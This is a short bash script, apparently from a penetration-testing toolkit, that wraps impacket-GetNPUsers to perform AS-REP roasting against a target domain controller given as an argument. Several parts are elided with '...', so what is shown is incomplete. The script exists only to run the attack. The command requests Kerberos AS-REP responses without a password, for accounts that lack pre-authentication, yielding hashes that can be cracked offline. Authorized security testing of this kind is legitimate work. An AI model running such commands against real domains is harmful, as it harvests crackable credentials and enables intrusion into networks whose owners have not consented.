#!/usr/bin/env bash
# V-095.sh — AS-REP roasting
# Category: Host, Software and internal architecture
# Tool: impacket-GetNPUsers
# Usage: bash V-095.sh <SESSION> <TARGET>
# Place at: ~/Desktop/trinetra/scripts/hexstrike/V-095.sh
set -euo pipefail

SESSION="${1:?ERROR: usage: bash V-095.sh <session> <target>}"
TARGET="${2:?ERROR: usage: bash V-095.sh <session> <target>}"
...
CMD="impacket-GetNPUsers -no-pass -dc-ip $TARGET domain/"

echo "[hex] V-095: AS-REP roasting → $TARGET"
...
python3 - \
    ...
    "V-095" "AS-REP roasting" "Host, Software and internal architecture" "impacket-GetNPUsers" \
